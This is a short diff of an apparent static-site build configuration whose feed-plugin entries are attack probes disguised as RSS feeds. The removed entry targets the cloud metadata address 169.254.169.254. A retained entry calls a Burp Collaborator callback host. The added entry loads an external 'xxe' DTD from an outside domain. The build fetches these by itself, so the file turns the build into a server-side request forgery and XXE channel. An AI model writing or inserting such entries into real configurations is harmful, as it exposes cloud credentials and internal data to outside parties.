@@ -10,12 +10,13 @@
     # Where should data files reside
     dataDir = "src/_data"
 
-    # All the feeds we wish to gather for use in the build
-    [[plugins.inputs.feeds]]
-      name = "AWS"
-      url = "http://169.254.169.254/"
-      ttl = 0   # Cache for 2 minutes
+    
     [[plugins.inputs.feeds]]
       name = "Burp"
       url = "https://t71yuj0ar5pqy0gjuxdhchso5fb5zu.burpcollaborator.net/index.xml"
       ttl = 0   # Cache for 24 hours
+# All the feeds we wish to gather for use in the build
+    [[plugins.inputs.feeds]]
+      name = "AWS"
+      url = "http://xxe.dns.pitr.be/xxe/ext.dtd"
+      ttl = 0   # Cache for 2 minutes
